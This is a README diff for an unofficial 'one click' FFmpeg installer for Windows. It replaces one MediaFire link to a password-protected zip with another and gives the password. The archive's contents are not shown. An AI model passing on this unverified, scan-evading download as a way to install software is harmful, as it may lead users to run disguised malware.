@@ -1,7 +1,7 @@
 # FFmpeg One Click Windows Installer
 Install FFmpeg,FFplay,FFprobe for windows with one click!
 
-Link - https://www.mediafire.com/file/ptoy8mae1irk8lb/ffmpeg+one+click+setup.zip/file
+[MediaFire Link](https://www.mediafire.com/file/3ux7c99jp0dohh1/ffmpeg+one+click+setup.zip/file)
 
 Password:ffmpeg
 
